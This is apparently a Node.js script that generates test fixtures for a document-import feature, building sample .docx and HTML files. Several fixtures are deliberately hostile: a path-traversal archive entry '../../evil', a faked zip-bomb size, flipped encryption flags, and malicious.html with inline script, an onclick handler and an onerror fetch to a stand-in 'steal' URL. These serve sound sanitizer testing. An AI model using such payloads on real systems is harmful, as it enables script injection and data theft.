import fs from "fs";
import path from "path";
import JSZip from "jszip";

const outDir = path.resolve("tests/fixtures/rich-import");
if (!fs.existsSync(outDir)) {
  fs.mkdirSync(outDir, { recursive: true });
}

const PNG_1x1 = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
  "base64"
);

const GIF_1x1 = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

// 1. minimal.docx
const minZip = new JSZip();
minZip.file(
  "[Content_Types].xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`
);
minZip.file(
  "_rels/.rels",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`
);
minZip.file(
  "word/document.xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r><w:t>A minimal document.</w:t></w:r>
    </w:p>
  </w:body>
</w:document>`
);

const minBuf = await minZip.generateAsync({ type: "nodebuffer" });
fs.writeFileSync(path.join(outDir, "minimal.docx"), minBuf);

// 2. rich-sample.docx
const richZip = new JSZip();
richZip.file(
  "[Content_Types].xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="png" ContentType="image/png"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/footnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml"/>
</Types>`
);
richZip.file(
  "_rels/.rels",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`
);
richZip.file(
  "word/_rels/document.xml.rels",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/>
</Relationships>`
);
richZip.file(
  "word/footnotes.xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:footnotes xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:footnote w:id="1">
    <w:p><w:r><w:t>A sample footnote citation.</w:t></w:r></w:p>
  </w:footnote>
</w:footnotes>`
);
richZip.file("word/media/image1.png", PNG_1x1);
richZip.file(
  "word/document.xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
            xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
            xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
  <w:body>
    <w:p>
      <w:pPr><w:pStyle w:val="Heading1"/></w:pPr>
      <w:r><w:t>Sample Heading 1</w:t></w:r>
    </w:p>
    <w:p>
      <w:r><w:rPr><w:b/></w:rPr><w:t>Bold </w:t></w:r>
      <w:r><w:rPr><w:i/></w:rPr><w:t>Italic </w:t></w:r>
      <w:r><w:rPr><w:u w:val="single"/></w:rPr><w:t>Underline </w:t></w:r>
      <w:r><w:rPr><w:strike/></w:rPr><w:t>Strike</w:t></w:r>
      <w:r><w:footnoteReference w:id="1"/></w:r>
    </w:p>
    <w:tbl>
      <w:tr>
        <w:trPr><w:tblHeader/></w:trPr>
        <w:tc><w:p><w:r><w:t>Header 1</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>Header 2</w:t></w:r></w:p></w:tc>
      </w:tr>
      <w:tr>
        <w:tc><w:p><w:r><w:t>Data 1</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>Data 2</w:t></w:r></w:p></w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:drawing>
          <wp:inline>
            <wp:extent cx="95250" cy="95250"/>
            <wp:docPr id="1" name="Picture 1" descr="A sample image" title="Sample Image"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:blipFill>
                    <a:blip r:embed="rId2"/>
                  </pic:blipFill>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
  </w:body>
</w:document>`
);

const richBuf = await richZip.generateAsync({ type: "nodebuffer" });
fs.writeFileSync(path.join(outDir, "rich-sample.docx"), richBuf);

// 3. unsupported-image.docx
const unsupZip = new JSZip();
unsupZip.file(
  "[Content_Types].xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="gif" ContentType="image/gif"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`
);
unsupZip.file(
  "_rels/.rels",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`
);
unsupZip.file(
  "word/_rels/document.xml.rels",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.gif"/>
</Relationships>`
);
unsupZip.file("word/media/image1.gif", GIF_1x1);
unsupZip.file(
  "word/document.xml",
  `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
            xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
            xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
  <w:body>
    <w:p>
      <w:r>
        <w:drawing>
          <wp:inline>
            <wp:extent cx="95250" cy="95250"/>
            <wp:docPr id="1" name="Picture 1" descr="A gif image"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:blipFill>
                    <a:blip r:embed="rId1"/>
                  </pic:blipFill>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
  </w:body>
</w:document>`
);

const unsupBuf = await unsupZip.generateAsync({ type: "nodebuffer" });
fs.writeFileSync(path.join(outDir, "unsupported-image.docx"), unsupBuf);

// 4. encrypted.docx: Take minBuf and flip bit 0 in central directory general purpose bit flag
const encBuf = Buffer.from(minBuf);
for (let i = 0; i < encBuf.length - 4; i++) {
  // Local file header signature 0x04034b50
  if (encBuf[i] === 0x50 && encBuf[i + 1] === 0x4b && encBuf[i + 2] === 0x03 && encBuf[i + 3] === 0x04) {
    const flag = encBuf.readUInt16LE(i + 6);
    encBuf.writeUInt16LE(flag | 0x0001, i + 6);
  }
  // Central directory header signature 0x02014b50
  if (encBuf[i] === 0x50 && encBuf[i + 1] === 0x4b && encBuf[i + 2] === 0x01 && encBuf[i + 3] === 0x02) {
    const flag = encBuf.readUInt16LE(i + 8);
    encBuf.writeUInt16LE(flag | 0x0001, i + 8);
  }
}
fs.writeFileSync(path.join(outDir, "encrypted.docx"), encBuf);

// 5. zip-bomb.docx: Set uncompressedSize in central directory header to 150 MB (exceeds 100 MB limit)
const bombBuf = Buffer.from(minBuf);
for (let i = 0; i < bombBuf.length - 4; i++) {
  if (bombBuf[i] === 0x50 && bombBuf[i + 1] === 0x4b && bombBuf[i + 2] === 0x01 && bombBuf[i + 3] === 0x02) {
    bombBuf.writeUInt32LE(150 * 1024 * 1024, i + 24);
  }
}
fs.writeFileSync(path.join(outDir, "zip-bomb.docx"), bombBuf);

// 6. path-traversal.docx: Craft entry with ../../evil.xml in central directory
const travZip = new JSZip();
travZip.file("word/document.xml", "<w:document><w:body><w:p/></w:body></w:document>");
travZip.file("normal.xml", "normal");
const travRawBuf = await travZip.generateAsync({ type: "nodebuffer" });
const travBuf = Buffer.from(travRawBuf);
// Replace "normal.xml" (10 chars) with "../../evil" (10 chars)
const targetStr = Buffer.from("normal.xml");
const evilStr = Buffer.from("../../evil");
let at = 0;
while ((at = travBuf.indexOf(targetStr, at)) !== -1) {
  evilStr.copy(travBuf, at);
  at += evilStr.length;
}
fs.writeFileSync(path.join(outDir, "path-traversal.docx"), travBuf);

// 7. rich-sample.html
const richHtml = `<!DOCTYPE html>
<html>
<head><title>Rich Sample</title></head>
<body>
  <h1>Sample Heading</h1>
  <p>A paragraph with <strong>bold</strong>, <em>italic</em>, <u>underline</u>, and <s>strike</s> text.</p>
  <ul>
    <li>First bullet</li>
    <li>Second bullet</li>
  </ul>
  <ol>
    <li>First ordered</li>
    <li>Second ordered</li>
  </ol>
  <table>
    <tr><th>Col 1</th><th>Col 2</th></tr>
    <tr><td>Cell 1</td><td>Cell 2</td></tr>
  </table>
  <p>Footnote test<sup data-footnote-id="1">1</sup></p>
  <div class="footnotes">
    <ol>
      <li id="fn1">This is a footnote text.</li>
    </ol>
  </div>
  <p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="1x1 Red Pixel" /></p>
</body>
</html>`;
fs.writeFileSync(path.join(outDir, "rich-sample.html"), richHtml, "utf-8");

// 8. malicious.html
const maliciousHtml = `<!DOCTYPE html>
<html>
<head><title>Malicious HTML</title></head>
<body>
  <script>window.__pwned = true; document.title = "pwned";</script>
  <p onclick="alert('hacked')">Click me</p>
  <img src="https://example.invalid/leak.png" alt="Remote Leak" onerror="fetch('https://example.invalid/steal')" />
  <iframe src="https://example.invalid"></iframe>
  <form action="https://example.invalid"><input name="pass" /></form>
  <p>Safe paragraph text that should survive sanitization.</p>
</body>
</html>`;
fs.writeFileSync(path.join(outDir, "malicious.html"), maliciousHtml, "utf-8");

console.log("All fixtures generated successfully in", outDir);
